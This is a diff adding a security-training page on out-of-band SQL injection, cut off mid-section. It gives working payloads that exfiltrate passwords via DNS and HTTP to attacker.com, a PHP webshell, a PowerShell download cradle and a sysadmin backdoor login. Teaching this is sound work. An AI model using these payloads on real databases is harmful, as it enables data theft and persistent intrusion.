@@ -8994,6 +8994,2410 @@ Attackers use round delay values (1s, 3s, 5s, 10s). Response times clustered aro
 \`\`\`
 `;
 
+
+
+PAGES.sqli_oob = `
+<p>
+<span style="background:#dc3545;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CRITICAL</span>&nbsp;
+<span style="background:#6c757d;color:#fff;padding:2px 8px;border-radius:3px;">CWE-89</span>&nbsp;
+<span style="background:#6c757d;color:#fff;padding:2px 8px;border-radius:3px;">CAPEC-7</span>&nbsp;
+<span style="background:#dc3545;color:#fff;padding:2px 8px;border-radius:3px;">CVSS 9.8</span>&nbsp;
+<span style="background:#fd7e14;color:#fff;padding:2px 8px;border-radius:3px;">OWASP A05:2025</span>&nbsp;
+<span style="background:#17a2b8;color:#fff;padding:2px 8px;border-radius:3px;">CWE Top 25: 2019-2025</span>
+</p>
+
+# Out-of-Band (OOB) SQL Injection
+
+**CAT-01 > SQL Injection > Out-of-Band**
+
+---
+
+## Overview
+
+Out-of-band SQL injection forces the database server to initiate an outbound network request -- DNS lookup, HTTP call, SMB connection, LDAP query, or SMTP handshake -- that carries extracted data to an attacker-controlled server over a channel entirely separate from the HTTP response. The attacker never reads the exfiltrated data from the application's HTTP body, error messages, boolean content differences, or response timing. Instead, the data arrives at a DNS listener as a subdomain label, at an HTTP server as a URL path parameter, or at an SMB listener as a UNC path component. The HTTP response the attacker receives from the web application is irrelevant. The data already left through the back door.
+
+The mechanism depends on a fundamental architectural reality: databases are not isolated processes. They run on operating systems with network stacks, DNS resolvers, and outbound connectivity. Microsoft SQL Server ships with \`xp_dirtree\`, \`xp_fileexist\`, and \`xp_subdirs\` -- extended stored procedures that resolve UNC paths, triggering DNS lookups even before checking file permissions. Oracle Database ships with \`UTL_HTTP\`, \`UTL_INADDR\`, \`DBMS_LDAP\`, \`HTTPURITYPE\`, \`UTL_TCP\`, and \`UTL_SMTP\` -- a full suite of network client functions accessible from SQL context. PostgreSQL provides \`COPY TO PROGRAM\`, which executes arbitrary OS commands directly from a query. Even Oracle's XML parser can be weaponized: injecting an XMLType with an external DTD entity causes the parser to fetch a remote URL, leaking concatenated query results as subdomain components in the DNS lookup that precedes the HTTP connection. Every one of these functions turns the database into an HTTP client, DNS resolver, or SMB initiator -- sending data outward through a network path the application layer never monitors.
+
+DNS is the protocol of choice for OOB exfiltration because it is almost never firewalled outbound. Port 53 UDP traffic is required for basic hostname resolution, and blocking it breaks virtually every service on the network. Even in environments with strict egress rules that block HTTP (80/443) and SMB (445), DNS resolution almost always passes through. The attacker registers a domain, points its NS records to a server they control, and captures every DNS query that arrives. When the database resolves \`admin-password-hash.attacker.com\`, that query traverses the corporate DNS resolver, exits the network, and reaches the attacker's nameserver -- carrying the extracted password in the subdomain label. The query itself is the data channel. No HTTP response is needed. No connection to the attacker's IP is visible to the application. The exfiltration happens at a layer below what WAFs, reverse proxies, and application-level logging are designed to monitor.
+
+OOB techniques are classified as the highest-capability tier in the SQL injection hierarchy because they bypass every defensive signal that other blind techniques depend on. Boolean-based blind requires observable content differences between TRUE and FALSE responses. Time-based blind requires measurable response latency differences. Both fail against asynchronous execution architectures (queued jobs, message buses, fire-and-forget SQL), where the injected query executes after the HTTP response has already been sent. OOB injection works regardless of execution timing because the outbound request from the database is independent of the web application's response lifecycle. PortSwigger's research team explicitly notes that OAST (Out-of-Band Application Security Testing) techniques are "often preferable even in situations where other techniques for blind exploitation do work" because they have a "high chance of success" and enable "direct data exfiltration" without inference.
+
+The real-world impact is severe and well-documented. CVE-2023-48788 (FortiClient EMS, CVSS 9.8) was exploited using MSSQL stacked queries to re-enable \`xp_cmdshell\` and establish OOB command execution -- CISA KEV listed with confirmed active exploitation. CVE-2024-43468 (Microsoft SCCM, CVSS 9.8) executes SQL as a sysadmin-level machine account, giving trivial access to all MSSQL OOB functions. CVE-2024-9264 (Grafana, CVSS 9.4) introduced an entirely new OOB vector through DuckDB's embedded SQL engine, where \`read_csv_auto()\` and the \`httpfs\` extension enable HTTP-based exfiltration from within an analytics query. The Cl0p ransomware group weaponized SQLi-to-OOB chains in two of the largest breaches in history: MOVEit Transfer (CVE-2023-34362, 8,000+ organizations) and Accellion FTA (CVE-2021-27101, 100+ organizations). In both cases, SQL injection provided initial access, and a deployed webshell served as the persistent OOB exfiltration channel -- separating the injection vector from the data theft path to evade detection.
+
+This page completes the SQL injection series. Classic, error-based, union-based, boolean blind, and time-based blind are covered on pages 01-05. OOB is the technique that works when nothing else does.
+
+---
+
+## Understanding From Zero
+
+### The Core Concept (No Jargon)
+
+Imagine you are a student in a classroom taking an exam. The teacher is watching everything that comes out of your mouth -- you cannot speak answers aloud (that would be classic SQLi returning data in the response). You cannot cough in a pattern to signal letters (that would be boolean blind, changing observable behavior). You cannot take suspiciously long pauses before writing (that would be time-based blind, measurable delays).
+
+But the teacher is not watching what happens under the desk. You tear off a corner of paper, write the answer on it, and slip it to the student sitting behind you. That student passes it backward until it reaches your friend at the back of the room. The teacher sees nothing unusual. Your mouth stayed shut. Your timing was normal. Your paper looks the same as everyone else's. But the answer left the room through a channel the teacher was not monitoring.
+
+That is out-of-band SQL injection. The database (you) has the secret data (the answer). The application (the teacher) monitors the HTTP response (what comes out of your mouth). But the database sends the data through a DNS request (the note under the desk) to the attacker's server (your friend at the back). The application never sees it leave.
+
+DNS is the preferred note-passing channel because it works like the school's ventilation system -- it is always running, everyone depends on it, and nobody checks what is riding on it. Blocking DNS would be like sealing the air vents -- everything in the building stops working. So the notes pass through freely, carrying database passwords encoded as subdomain labels that look like ordinary DNS queries to anyone who glances at the network traffic.
+
+### What's Actually Happening (Technical)
+
+The application has vulnerable code like this:
+
+\`\`\`python
+tracking_id = request.cookies.get('TrackingId')
+query = f"SELECT * FROM tracking WHERE id = '{tracking_id}'"
+db.execute(query)
+# No output, no errors, no timing -- response is always 200 OK
+\`\`\`
+
+The attacker injects a payload that makes the database resolve an attacker-controlled domain:
+
+\`\`\`
+TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ <!ENTITY % r SYSTEM "http://'||(SELECT password FROM users
+WHERE username='administrator')||'.attacker.com/"> %r;]>'),'/l') FROM dual--
+\`\`\`
+
+The Oracle database parses the XML, encounters the external DTD entity, and attempts to fetch \`http://S3cretP4ss.attacker.com/\`. This triggers a DNS lookup for \`S3cretP4ss.attacker.com\` at the attacker's nameserver. The attacker reads \`S3cretP4ss\` from the DNS query log. The HTTP response to the original web request is unchanged -- still 200 OK with the same body. The password exited through DNS.
+
+---
+
+## Attack Surface Identification
+
+### Database OOB Capability Matrix
+
+| Database | OOB Capability | Primary Protocol | Minimum Privilege | OS Dependency |
+|----------|---------------|-----------------|-------------------|---------------|
+| **MSSQL** | Richest -- 11+ functions | DNS/SMB (UNC paths) | PUBLIC (xp_dirtree) | Windows for UNC; any for xp_cmdshell |
+| **Oracle** | Most diverse -- 10+ packages | HTTP/DNS/LDAP/TCP/SMTP | None on unpatched (XMLType XXE) | Cross-platform |
+| **PostgreSQL** | Moderate -- requires superuser | DNS/HTTP (via OS commands) | Superuser or pg_execute_server_program | Cross-platform |
+| **MySQL** | Severely limited | SMB/DNS (UNC paths) | FILE privilege | **Windows ONLY** |
+| **SQLite** | Effectively none | SMB (UNC via load_extension) | Extension loading enabled | **Windows ONLY** |
+| **DuckDB** | Novel -- HTTP native | HTTP/S3 (built-in) | Query execution | Cross-platform (in-process) |
+
+### Per-Database OOB Function Reference
+
+#### MSSQL Functions
+
+| Function | Protocol | Privilege Required | Data Exfil | Notes |
+|----------|----------|-------------------|------------|-------|
+| \`xp_dirtree\` | SMB/DNS | PUBLIC (default) | Yes | DNS lookup occurs before permission check |
+| \`xp_fileexist\` | SMB/DNS | PUBLIC (default) | Yes | Same UNC mechanism as xp_dirtree |
+| \`xp_subdirs\` | SMB/DNS | PUBLIC (default) | Yes | Rarely in WAF rulesets |
+| \`fn_xe_file_target_read_file\` | SMB/DNS | VIEW SERVER STATE | Yes | Extended Events file reader |
+| \`fn_get_audit_file\` | SMB/DNS | CONTROL SERVER | Yes | SQL Audit file reader |
+| \`fn_trace_gettable\` | SMB/DNS | ALTER TRACE | Yes | SQL Trace file reader |
+| \`xp_cmdshell\` | Any (OS cmd) | sysadmin | Yes | Disabled by default since MSSQL 2005 |
+| \`OPENROWSET\` | TCP/DNS | Ad Hoc Queries enabled | Yes | OLE DB remote data access |
+| \`sp_OACreate/sp_OAMethod\` | HTTP/HTTPS | sysadmin + OLE enabled | Yes | Full HTTP client via MSXML2 or WinHTTP |
+| \`CLR Assembly\` | HTTP/DNS | sysadmin | Yes | Custom .NET code in SQL context |
+| \`sp_add_jobstep\` | Any (OS cmd) | SQLAgentOperator+ | Yes | SQL Server Agent job execution |
+
+#### Oracle Functions
+
+| Function | Protocol | Privilege Required | Patched? | Notes |
+|----------|----------|-------------------|----------|-------|
+| \`XMLType\` + external DTD | HTTP/DNS | None (unpatched) | Patched in newer versions | XXE in XML parser -- bypasses ACLs |
+| \`UTL_INADDR.GET_HOST_ADDRESS\` | DNS | Network ACL | Works on patched | DNS resolution only |
+| \`UTL_HTTP.REQUEST\` | HTTP | Network ACL | Works on patched | Full HTTP GET/POST |
+| \`HTTPURITYPE.GETCLOB()\` | HTTP | Network ACL | Works on patched | HTTP via abstract URI type |
+| \`DBMS_LDAP.INIT\` | LDAP/DNS | PUBLIC (often) | Works on patched | DNS via LDAP connection init |
+| \`SYS.DBMS_LDAP.INIT\` | LDAP/DNS | PUBLIC (often) | Works on patched | SYS schema variant |
+| \`UTL_TCP\` | TCP (raw) | Network ACL | Works on patched | Arbitrary TCP connections |
+| \`UTL_SMTP.OPEN_CONNECTION\` | SMTP/DNS | Network ACL | Works on patched | SMTP protocol client |
+| \`DBMS_CLOUD.SEND_REQUEST\` | HTTP/HTTPS | CREATE CREDENTIAL | 19c+ only | Modern HTTP client |
+| \`SYS_DNSRESOLVE\` | DNS | DBA/elevated | 18c+ only | Direct DNS resolution |
+
+#### PostgreSQL Functions
+
+| Function | Privilege | Protocol | Notes |
+|----------|-----------|----------|-------|
+| \`COPY TO PROGRAM\` | Superuser / pg_execute_server_program | Any (OS cmd) | Most powerful -- full shell access |
+| \`dblink_connect\` | dblink extension + DBA | TCP/DNS | DNS via connection attempt |
+| PL/pgSQL + COPY UNC | Superuser | SMB/DNS | Windows only |
+| \`system()\` C function | Superuser + CREATE | Any (OS cmd) | Wrapper around libc system() |
+| \`lo_export\` | Superuser | Filesystem/SMB | Large object write to UNC (Windows) |
+
+#### MySQL Functions
+
+| Function | Platform | Privilege | Protocol | Notes |
+|----------|----------|-----------|----------|-------|
+| \`LOAD_FILE\` (UNC) | **Windows ONLY** | FILE | SMB/DNS | Linux = no OOB |
+| \`INTO OUTFILE\` (UNC) | **Windows ONLY** | FILE | SMB/DNS | Writes trigger SMB |
+| \`LOAD DATA INFILE\` (UNC) | **Windows ONLY** | FILE | SMB/DNS | Read from UNC share |
+| UDF (sys_exec/sys_eval) | Any OS | Plugin dir write | Any | Custom shared library |
+
+### Critical Insight: MySQL on Linux Has No Native OOB
+
+PentestMonkey explicitly marks DNS exfiltration from MySQL on Linux as "Impossible?" through standard SQL functions. All MySQL OOB techniques depend on UNC path resolution, which is a Windows-only mechanism. On Linux, the only path to OOB is deploying a User Defined Function (UDF) -- a compiled shared library placed in the MySQL plugin directory -- which requires write access to that directory and the CREATE FUNCTION privilege.
+
+---
+
+## How It Works
+
+\`\`\`mermaid
+sequenceDiagram
+    participant A as Attacker
+    participant W as Web Application
+    participant D as Database Server
+    participant N as Attacker DNS/HTTP Server
+
+    A->>W: HTTP Request with OOB SQLi payload
+    W->>D: Execute SQL query containing OOB function
+    Note over W: Returns normal HTTP response (200 OK)
+    W-->>A: HTTP Response (no data, no error, no delay)
+
+    Note over D: Database processes injected SQL
+    D->>D: Executes OOB function (xp_dirtree, UTL_HTTP, etc.)
+    D->>N: Outbound request (DNS/HTTP/SMB) with data in hostname/URL
+    Note over N: Attacker reads exfiltrated data from request logs
+
+    Note over A,N: Data exfiltrated via SEPARATE CHANNEL
+    Note over A,N: HTTP response was irrelevant -- data arrived via DNS
+\`\`\`
+
+### Step-by-Step DNS Exfiltration Flow
+
+1. **Attacker sets up listener**: Registers domain (e.g., \`oob.attacker.com\`), configures NS records pointing to their server, runs DNS listener on port 53
+2. **Attacker injects payload**: Sends HTTP request with SQL injection that concatenates a query result into a hostname
+3. **Web application executes query**: Passes the injected SQL to the database
+4. **Database evaluates OOB function**: \`xp_dirtree('\\\\' + (SELECT password FROM users) + '.oob.attacker.com\\x')\` or \`UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.oob.attacker.com')\`
+5. **OS DNS resolver activates**: The database host resolves \`password-value.oob.attacker.com\`
+6. **DNS query traverses network**: Recursive resolver forwards the query to \`oob.attacker.com\`'s authoritative nameserver (attacker's server)
+7. **Attacker captures data**: Reads \`password-value\` from the subdomain label in the DNS query log
+8. **Application returns normally**: HTTP 200 OK with unchanged response body -- no trace of exfiltration in the HTTP layer
+
+---
+
+## Detection and Validation
+
+### Phase 1: Confirm OOB Connectivity
+
+Before extracting data, confirm the database can make outbound requests:
+
+**MSSQL** -- inject the simplest UNC path:
+\`\`\`sql
+'; EXEC master..xp_dirtree '\\\\COLLABORATOR-SUBDOMAIN\\a'--
+\`\`\`
+
+**Oracle** -- inject XMLType with external entity:
+\`\`\`sql
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % r SYSTEM "http://COLLABORATOR-SUBDOMAIN/"> %r;]>'),'/l') FROM dual--
+\`\`\`
+
+**PostgreSQL** -- inject COPY TO PROGRAM:
+\`\`\`sql
+'; COPY (SELECT '') TO PROGRAM 'nslookup COLLABORATOR-SUBDOMAIN'--
+\`\`\`
+
+**MySQL (Windows only)** -- inject LOAD_FILE:
+\`\`\`sql
+' UNION SELECT LOAD_FILE('\\\\\\\\COLLABORATOR-SUBDOMAIN\\\\a')--
+\`\`\`
+
+If a DNS/HTTP interaction appears in Burp Collaborator or interactsh, OOB connectivity is confirmed. If not, try alternative functions for the same database (see fallback chains in Detection Evasion section).
+
+### Phase 2: Extract Data
+
+Replace the detection payload with one that concatenates query output into the subdomain:
+
+\`\`\`sql
+-- MSSQL: extract current user
+'; DECLARE @d VARCHAR(1024);SELECT @d=SYSTEM_USER;EXEC('master..xp_dirtree "\\\\'+@d+'.COLLABORATOR\\a"')--
+
+-- Oracle: extract administrator password
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % r SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR/"> %r;]>'),'/l') FROM dual--
+\`\`\`
+
+### Phase 3: Verify Exfiltrated Data
+
+The extracted value appears as a subdomain label in the DNS interaction log. For Burp Collaborator: check the Collaborator tab, click on the DNS interaction, and read the subdomain. For interactsh: the CLI prints the full domain including the data-bearing subdomain.
+
+---
+
+## Beginner Lab Walkthrough
+
+### PortSwigger Lab: "Blind SQL injection with out-of-band data exfiltration"
+
+**Lab URL**: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
+
+**Objective**: Extract the administrator's password via DNS exfiltration and log in.
+
+**Database**: Oracle (query executes asynchronously -- no boolean/time signals work)
+
+**Injection Point**: \`TrackingId\` cookie
+
+**Target Table**: \`users\` (columns: \`username\`, \`password\`)
+
+#### Step 1: Open Burp Collaborator Client
+
+In Burp Suite Professional, go to the Collaborator tab. Click "Copy to clipboard" to generate a unique Collaborator subdomain (e.g., \`a1b2c3d4e5.burpcollaborator.net\`).
+
+#### Step 2: Craft the OOB Exfiltration Payload
+
+The payload uses Oracle's XMLType XXE to force an HTTP request containing the password as a subdomain:
+
+\`\`\`
+TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.a1b2c3d4e5.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
+\`\`\`
+
+#### Step 3: URL-Encode and Send
+
+URL-encode the payload for use in the cookie header:
+
+\`\`\`
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.a1b2c3d4e5.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+\`\`\`
+
+Send the request using Burp Repeater.
+
+#### Step 4: Poll Collaborator for Results
+
+Return to the Collaborator tab. Click "Poll now." A DNS interaction appears showing the full domain queried by the Oracle server:
+
+\`\`\`
+S3cureP4ssw0rd.a1b2c3d4e5.burpcollaborator.net
+\`\`\`
+
+The administrator's password is \`S3cureP4ssw0rd\` (the subdomain before your Collaborator domain).
+
+#### Step 5: Log In
+
+Navigate to the login page, enter \`administrator\` / \`S3cureP4ssw0rd\`, and the lab is solved.
+
+#### Why This Works
+
+The Oracle XMLType parser encounters the external DTD entity and attempts to resolve \`http://S3cureP4ssw0rd.a1b2c3d4e5.burpcollaborator.net/\`. This triggers a DNS lookup for that hostname. The DNS query reaches Burp's Collaborator server, which logs the full domain including the data-bearing subdomain. The application's HTTP response is unchanged -- no error, no data, no timing difference. The password exited entirely through DNS.
+
+---
+
+## Techniques
+
+### Level 0: Understanding DNS as a Data Channel
+
+DNS is the backbone of the internet's naming system. Every time any program needs to contact a hostname, the operating system performs a DNS lookup to translate that name into an IP address. This lookup is a UDP packet sent to port 53 of a DNS resolver, which recursively queries authoritative nameservers until it gets an answer.
+
+The critical insight for OOB exfiltration: the subdomain labels in a DNS query are arbitrary strings chosen by whoever initiated the lookup. If the database resolves \`extracted-data.attacker.com\`, the string \`extracted-data\` is visible to the authoritative nameserver for \`attacker.com\` -- which the attacker controls.
+
+**DNS label constraints** (RFC 1035):
+
+| Constraint | Limit |
+|-----------|-------|
+| Max characters per label | 63 |
+| Max total FQDN length | 253 |
+| Max subdomain levels | 127 |
+| Allowed characters | a-z, 0-9, hyphen (-) |
+| Cannot start/end with | Hyphen |
+| Case sensitivity | Case-insensitive |
+
+**Practical capacity**: Hex encoding doubles data size (1 byte becomes 2 hex chars), so a 63-char label carries approximately 31 bytes of original data. Using multiple subdomain levels (\`chunk1.chunk2.chunk3.attacker.com\`), a single DNS query can carry roughly 200 characters of hex-encoded data.
+
+**DNS caching**: DNS responses are cached by resolvers. Each exfiltration query MUST use a unique value or include a random nonce prefix to bypass caching. Otherwise, the resolver returns a cached answer and the query never reaches the attacker's nameserver.
+
+### Level 1: Basic OOB Callbacks
+
+#### MSSQL -- xp_dirtree DNS Callback
+
+The simplest OOB technique. \`xp_dirtree\` is an extended stored procedure that lists directory contents. When given a UNC path (\`\\\\hostname\\share\`), it triggers a DNS lookup followed by an SMB connection. The DNS lookup happens even if the user lacks permission to list the directory.
+
+\`\`\`sql
+-- Detection only (no data)
+EXEC master..xp_dirtree '\\\\attacker.com\\test'
+
+-- Data exfiltration: current user
+DECLARE @d VARCHAR(1024);
+SELECT @d = SYSTEM_USER;
+EXEC('master..xp_dirtree "\\\\'+@d+'.attacker.com\\x"')
+\`\`\`
+
+**Privilege**: PUBLIC role (default EXECUTE granted). No special configuration needed.
+
+#### Oracle -- UTL_INADDR DNS Callback
+
+\`UTL_INADDR.GET_HOST_ADDRESS\` resolves a hostname to an IP address. The hostname argument triggers a DNS lookup at the OS level.
+
+\`\`\`sql
+-- Detection only
+SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM dual
+
+-- Data exfiltration: current user
+SELECT UTL_INADDR.GET_HOST_ADDRESS(
+  (SELECT user FROM dual) || '.attacker.com'
+) FROM dual
+\`\`\`
+
+**Privilege**: Requires EXECUTE on UTL_INADDR and network ACL grants on Oracle 12c+.
+
+### Level 2: Data Extraction via DNS Subdomains
+
+#### SUBSTRING Chunking for Large Data
+
+When the target data exceeds 63 characters (DNS label limit), extract it in chunks with sequence numbers:
+
+**MSSQL chunked exfiltration**:
+\`\`\`sql
+DECLARE @data VARCHAR(4000), @c INT;
+SELECT @data = (SELECT TOP 1 long_column FROM sensitive_table);
+SET @c = 1;
+WHILE @c <= LEN(@data)
+BEGIN
+  EXEC('master..xp_dirtree "\\\\' + CAST((@c/30) AS VARCHAR) + '.'
+    + CONVERT(VARCHAR(60), CAST(SUBSTRING(@data, @c, 30) AS VARBINARY(30)), 2)
+    + '.oob.attacker.com\\x"');
+  SET @c = @c + 30;
+END
+\`\`\`
+
+DNS queries arrive as:
+\`\`\`
+0.656d61696c5f61646472657373.oob.attacker.com    (chunk 0)
+1.5f686f6d655f70686f6e65.oob.attacker.com        (chunk 1)
+\`\`\`
+
+**Oracle chunked exfiltration**:
+\`\`\`sql
+-- First 40 characters
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE r [ <!ENTITY % x SYSTEM "http://'
+  || SUBSTR((SELECT password FROM users WHERE ROWNUM=1), 1, 40)
+  || '.attacker.com/"> %x;]>'),'/l') FROM dual
+
+-- Next 40 characters (offset 41)
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE r [ <!ENTITY % x SYSTEM "http://'
+  || SUBSTR((SELECT password FROM users WHERE ROWNUM=1), 41, 40)
+  || '.attacker.com/"> %x;]>'),'/l') FROM dual
+\`\`\`
+
+#### DNS-Safe Encoding
+
+Data containing characters invalid in DNS labels (spaces, dots, special characters, uppercase) must be encoded before exfiltration:
+
+**Hex encoding** (safest -- works everywhere):
+\`\`\`sql
+-- MSSQL
+DECLARE @d VARCHAR(1024);
+SELECT @d = CONVERT(VARCHAR(1024), CAST((SELECT TOP 1 password FROM users) AS VARBINARY(256)), 2);
+EXEC('master..xp_dirtree "\\\\'+@d+'.attacker.com\\x"')
+
+-- Oracle
+SELECT RAWTOHEX(UTL_RAW.CAST_TO_RAW(
+  (SELECT password FROM users WHERE ROWNUM=1)
+)) FROM dual
+
+-- MySQL
+SELECT HEX((SELECT password FROM users LIMIT 1))
+\`\`\`
+
+**Reassembly on attacker side** (Python):
+\`\`\`python
+import binascii
+data_hex = "53336372657450347373"  # from DNS query
+print(binascii.unhexlify(data_hex).decode())  # -> S3cretP4ss
+\`\`\`
+
+### Level 3: Oracle XMLType XXE, OLE Automation HTTP, COPY TO PROGRAM
+
+#### Oracle XMLType XXE -- Bypasses Network ACLs
+
+This is the most reliable Oracle OOB vector because it operates through the XML parser's external entity resolution -- a different code path from the UTL_* network packages. On unpatched installations, it works without any network ACL grants.
+
+\`\`\`sql
+SELECT EXTRACTVALUE(
+  xmltype('<?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE root [
+      <!ENTITY % remote SYSTEM "http://'
+      ||(SELECT password FROM users WHERE username='administrator')
+      ||'.attacker.com/">
+      %remote;
+    ]>'),
+  '/l'
+) FROM dual
+\`\`\`
+
+**How the chain works**: SQL injection inserts a UNION SELECT. The \`xmltype()\` function parses the injected XML. The XML contains an external DTD entity (\`SYSTEM "http://..."\`). Oracle's XML parser fetches the external resource, triggering a DNS lookup for the hostname. The hostname contains the concatenated query result. The attacker reads it from DNS.
+
+**Why this bypasses ACLs**: Standard Oracle OOB functions (UTL_HTTP, UTL_INADDR, DBMS_LDAP) require explicit network ACL grants since Oracle 12c. The XMLType XXE technique works through the XML parsing layer, which historically did not check ACLs. Oracle has patched this, but many installations remain unpatched.
+
+**Multi-protocol XXE**: The external entity URL can use different protocol handlers:
+- \`http://data.attacker.com/\` -- HTTP callback + DNS
+- \`ftp://attacker.com/data\` -- FTP callback
+- \`gopher://attacker.com/data\` -- Gopher callback
+- \`\\\\attacker.com\\share\` -- SMB/UNC callback (Windows)
+
+#### MSSQL OLE Automation -- Full HTTP Client
+
+When \`xp_cmdshell\` is disabled but OLE Automation Procedures are enabled, MSSQL becomes a full HTTP client:
+
+\`\`\`sql
+-- Enable OLE Automation (if sysadmin)
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+
+-- HTTP GET with exfiltrated data
+DECLARE @token INT;
+DECLARE @data NVARCHAR(4000);
+DECLARE @url NVARCHAR(4000);
+SELECT @data = (SELECT TOP 1 password FROM users);
+SET @url = 'http://attacker.com/?d=' + @data;
+EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @token OUT;
+EXEC sp_OAMethod @token, 'open', NULL, 'GET', @url, 'false';
+EXEC sp_OAMethod @token, 'send';
+EXEC sp_OADestroy @token;
+\`\`\`
+
+Alternative COM objects: \`WinHttp.WinHttpRequest.5.1\` can be used instead of \`MSXML2.ServerXMLHTTP\` if the latter is blocked.
+
+#### PostgreSQL COPY TO PROGRAM -- OS Command Execution
+
+The most powerful PostgreSQL OOB technique. Executes arbitrary OS commands from SQL context:
+
+\`\`\`sql
+-- DNS exfiltration via nslookup
+COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_user)||'.attacker.com'
+
+-- HTTP exfiltration via curl
+COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?d='||(SELECT current_user)
+
+-- Reusable PL/pgSQL function for repeated exfiltration
+CREATE OR REPLACE FUNCTION exfil(query TEXT) RETURNS VOID AS $$
+DECLARE result TEXT; cmd TEXT;
+BEGIN
+  EXECUTE query INTO result;
+  cmd := E'COPY (SELECT \\'\\') TO PROGRAM \\'nslookup '||result||E'.attacker.com\\'';
+  EXECUTE cmd;
+END;
+$$ LANGUAGE plpgsql SECURITY DEFINER;
+
+SELECT exfil('SELECT current_user');
+SELECT exfil('SELECT passwd FROM pg_shadow LIMIT 1');
+\`\`\`
+
+**Privilege**: Requires superuser or membership in \`pg_execute_server_program\` role (PostgreSQL 11+).
+
+### Level 4: The Stager Technique, DuckDB Embedded OLAP OOB, Custom Listeners, DNS Binary Search
+
+### The Stager Technique
+
+The Stager is the most operationally significant OOB methodology. It uses OOB as a **bootstrap channel** -- not the primary exfiltration path, but a confirmation and staging mechanism that pivots to a faster, more capable channel.
+
+**The core problem**: DNS exfiltration is slow. The 63-character label limit, hex encoding overhead, and one-query-per-value constraint make bulk data extraction impractical. Dumping a 10,000-row table through DNS subdomains could take hours and generates thousands of anomalous DNS queries. The Stager solves this by using OOB only for initial confirmation and minimal enumeration, then deploying a persistent high-bandwidth exfiltration channel.
+
+#### Phase 1: CONFIRM (Single OOB Ping)
+
+\`\`\`sql
+-- Single DNS query confirms injection exists
+'; EXEC xp_dirtree '\\\\canary.attacker.com\\x'--
+\`\`\`
+
+Result: DNS hit at attacker's nameserver. Injection confirmed. Zero data extracted.
+
+#### Phase 2: ENUMERATE (OOB Data Per Query)
+
+\`\`\`sql
+-- Extract first table name
+'; DECLARE @d VARCHAR(99)=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U');
+  EXEC xp_dirtree '\\\\'+@d+'.attacker.com\\x'--
+\`\`\`
+
+Result: Table name arrives as DNS subdomain. Repeat for column names. Minimal queries (5-10 total).
+
+#### Phase 3: STAGE (Deploy Persistent Exfiltration Channel)
+
+**Option A -- Write a webshell** (when the web root is writable):
+\`\`\`sql
+'; SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/.s.php'--
+\`\`\`
+Now the attacker has direct command execution without further SQLi.
+
+**Option B -- Enable xp_cmdshell and download stager** (MSSQL):
+\`\`\`sql
+'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+  EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/stage2.ps1'')'--
+\`\`\`
+Staged PowerShell script runs with the database service account's privileges.
+
+**Option C -- Create a new database user with remote access**:
+\`\`\`sql
+'; CREATE LOGIN stager WITH PASSWORD='P@ssw0rd123';
+  EXEC sp_addsrvrolemember 'stager','sysadmin';--
+\`\`\`
+Now connect directly to the database from outside. Full access. No more SQLi needed.
+
+#### Phase 4: EXFILTRATE (Via Staged Channel)
+
+Use the webshell, command shell, or direct database connection to dump everything at high speed. OOB was the initial foothold -- the staged channel handles the heavy lifting.
+
+#### When to Use Stager vs. Pure OOB
+
+| Scenario | Approach |
+|----------|----------|
+| Need 1-2 values (version, current_user) | Pure OOB -- one query per value |
+| Need to dump a full table | Stager -- stage a faster channel |
+| Target has egress filtering (no HTTP out) | DNS-only OOB for everything (slow but works) |
+| Need persistent access for future testing | Stager -- create user or webshell |
+| All OOB functions blocked by WAF | Chain: blind boolean to find writable path, then stage |
+
+---
+
+### DuckDB: The Embedded OLAP Paradigm Shift in OOB SQL Injection
+
+> **Novel coverage.** This subsection documents a fundamental change in how OOB SQL injection works that existing resources treat as a footnote. DuckDB is not "another database with OOB functions." It is an embedded analytical engine where HTTP data access is the **primary design purpose**, not an abusable side effect. The security model that governs traditional database OOB -- network ACLs, database firewalls, privileged function revocation -- does not exist here. Everything you know about defending against OOB SQL injection assumes a client-server database. DuckDB breaks that assumption.
+
+#### The Architectural Divide: Client-Server vs Embedded OLAP
+
+Every traditional database OOB technique documented on this page operates within the same architectural model: a **client-server database** running as a separate process on a dedicated port, managed by a DBA, protected by network-level controls. The application connects to the database over TCP. The DBA configures who can access which functions. The network team controls which ports are open outbound. The security team monitors the database server's DNS traffic.
+
